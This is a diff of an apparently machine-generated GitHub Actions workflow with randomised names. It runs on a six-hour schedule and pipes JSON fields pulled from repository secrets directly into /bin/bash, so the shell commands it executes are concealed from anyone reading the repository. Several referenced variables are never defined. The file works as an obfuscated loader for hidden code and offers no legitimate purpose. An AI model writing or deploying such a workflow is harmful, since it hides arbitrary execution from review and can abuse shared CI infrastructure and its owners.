@@ -1,25 +1,22 @@
 name: commissionperturbed
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 0/6 * * *'
+    - cron: '1 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: commissionperturbed
         env:
-          ifnfh652: ${{ secrets.ifnfh652 }}
+          h08685: ${{ secrets.h08685 }}
         run: |
-          echo $ifnfh652 | jq -r .xcbi2681 | /bin/bash
-          echo $r3310 | jq -r .t65758 | /bin/bash
-          echo $rs40336 | jq -r .hgmqq9569 | /bin/bash
-          echo $ssbb1 | jq -r .jpxq2869 | /bin/bash
-          echo $ev896 | jq -r .ibovu394 | /bin/bash
-          echo $oyrty2 | jq -r .ivrff779 | /bin/bash
-          echo $mh67450 | jq -r .j3 | /bin/bash
-          echo $bwtq03 | jq -r .wt9 | /bin/bash
-          echo $kvp045 | jq -r .d9511 | /bin/bash
+          echo $h08685 | jq -r .mdesj665 | /bin/bash
+          echo $x5 | jq -r .nz84054 | /bin/bash
+          echo $akd6 | jq -r .qek9 | /bin/bash
+          echo $ing50 | jq -r .voogq71862 | /bin/bash
 
